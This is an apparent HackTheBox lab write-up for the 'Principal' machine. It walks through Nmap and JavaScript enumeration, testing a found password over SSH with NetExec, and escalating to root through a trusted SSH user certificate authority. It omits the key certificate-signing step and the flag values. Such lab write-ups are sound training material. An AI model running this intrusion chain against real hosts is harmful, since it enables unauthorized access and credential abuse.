# HackTheBox: Principal Write-up

## Enumeration

I started by scanning the target with Nmap:

```bash
nmap -sSVC 10.129.57.149
```

The scan revealed two open ports:

```text
22/tcp   open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.14
8080/tcp open  http-proxy  Jetty
```

The web service on port `8080` exposed the following page:

```text
Principal Internal Platform - Login
```

## Web Enumeration

I inspected the application's JavaScript file:

```bash
curl -s http://10.129.57.149:8080/static/js/app.js
```

The source code contained useful information about the authentication flow:

```text
Authentication flow:
1. User submits credentials to /api/auth/login
2. Server returns encrypted JWT (JWE) token
3. Token is stored and sent as Bearer token for subsequent requests

Token handling:
- Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
- Public key available at /api/auth/jwks for token verification
- Inner JWT is signed with RS256
```

The application also documented the expected JWT claims:

```text
sub  - username
role - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
iss  - "principal-platform"
iat  - issued at
exp  - expiration
```

Several API endpoints were also visible in the client-side code:

```javascript
const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};
```

## JWKS Enumeration

The application's public JSON Web Key Set could be retrieved from:

```bash
curl -s http://10.129.57.149:8080/api/auth/jwks
```

The endpoint returned an RSA public key used by the authentication mechanism.

```json
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "..."
    }
  ]
}
```

## Credential Discovery

During further enumeration, I obtained the password:

```text
D3pl0y_$$H_Now42!
```

I tested the credential against the SSH users with NetExec:

```bash
nxc ssh 10.129.57.149 -u user.txt -p 'D3pl0y_$$H_Now42!'
```

The credential was valid for the deployment service account:

```text
[+] svcdeploy:D3pl0y_$$H_Now42! Linux - Shell access!
```

I then connected to the target over SSH:

```bash
ssh svc-deploy@10.129.57.149
```

This provided shell access as the `svc-deploy` user.

## Privilege Escalation

While enumerating the SSH configuration, I found a custom configuration file:

```bash
cat /etc/ssh/sshd_config.d/60-principal.conf
```

The configuration contained:

```text
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

The important setting was:

```text
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

This showed that the SSH server trusted a user certificate authority stored under:

```text
/opt/principal/ssh/
```

I generated a new ED25519 key pair:

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

The generated files were:

```text
/tmp/pwn
/tmp/pwn.pub
```

The source notes then show root SSH access using the generated key:

```bash
ssh -i /tmp/pwn root@localhost
```

This resulted in a root shell.

> Note: the original PDF does not contain the intermediate command between key generation and the final root SSH login. Because that step is missing from the source material, it has not been reconstructed here.

## Attack Path

```text
Nmap
  ↓
Jetty web application on port 8080
  ↓
Client-side JavaScript enumeration
  ↓
Authentication and JWKS information
  ↓
Credential discovery
  ↓
SSH access as svc-deploy
  ↓
SSH configuration enumeration
  ↓
TrustedUserCAKeys identified
  ↓
ED25519 key generation
  ↓
Root SSH access
```

## Notes

The user and root flag values have been intentionally removed from this public write-up.
